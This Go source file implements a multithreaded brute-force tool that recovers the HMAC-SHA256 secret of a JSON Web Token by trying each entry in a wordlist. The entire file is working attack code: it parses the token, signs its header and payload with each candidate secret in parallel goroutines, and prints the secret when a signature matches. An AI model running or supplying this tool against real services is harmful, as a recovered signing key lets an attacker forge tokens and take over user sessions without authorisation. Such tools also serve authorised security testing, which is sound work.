package main

import (
    "bufio"
    "crypto/hmac"
    "crypto/sha256"
    "encoding/base64"
    "flag"
    "fmt"
    "log"
    "os"
    "strings"
    "sync"
)

var wg sync.WaitGroup
var once sync.Once

func decodeBase64UrlSafe(data string) ([]byte, error) {
    data = strings.ReplaceAll(data, "-", "+")
    data = strings.ReplaceAll(data, "_", "/")
    switch len(data) % 4 {
    case 2:
        data += "=="
    case 3:
        data += "="
    }
    return base64.StdEncoding.DecodeString(data)
}

func generateSignature(secret, header, payload string) string {
    h := hmac.New(sha256.New, []byte(secret))
    h.Write([]byte(fmt.Sprintf("%s.%s", header, payload)))
    return base64.RawURLEncoding.EncodeToString(h.Sum(nil))
}

func bruteForceJWT(header, payload, signature string, wordlist []string, numThreads int) {
    secretChan := make(chan string, len(wordlist))
    resultChan := make(chan string, 1)

    go func() {
        for _, secret := range wordlist {
            secretChan <- secret
        }
        close(secretChan)
    }()

    worker := func() {
        defer wg.Done()
        for secret := range secretChan {
            genSig := generateSignature(secret, header, payload)
            if genSig == signature {
                once.Do(func() {
                    resultChan <- secret
                })
                return
            }
        }
    }

    for i := 0; i < numThreads; i++ {
        wg.Add(1)
        go worker()
    }

    go func() {
        wg.Wait()
        close(resultChan)
    }()

    if secret, ok := <-resultChan; ok {
        fmt.Printf("[+] Secret found: %s\n", secret)
    } else {
        fmt.Println("[!] Secret not found in wordlist")
    }
}

func main() {
    token := flag.String("t", "", "JWT token to decode")
    wordlistPath := flag.String("w", "", "Wordlist file for brute force")
    numThreads := flag.Int("T", 10, "Number of threads for brute force (default: 10)")
    flag.Parse()

    if *token == "" || *wordlistPath == "" {
        log.Fatal("Usage: jwtBruteForce -t <token> -w <wordlist> [-T <threads>]")
    }

    if *numThreads < 10 || *numThreads > 100 {
        log.Fatal("Number of threads must be between 10 and 100")
    }

    parts := strings.Split(*token, ".")
    if len(parts) != 3 {
        log.Fatal("Invalid JWT token")
    }

    file, err := os.Open(*wordlistPath)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    var wordlist []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        wordlist = append(wordlist, scanner.Text())
    }

    bruteForceJWT(parts[0], parts[1], parts[2], wordlist, *numThreads)
}
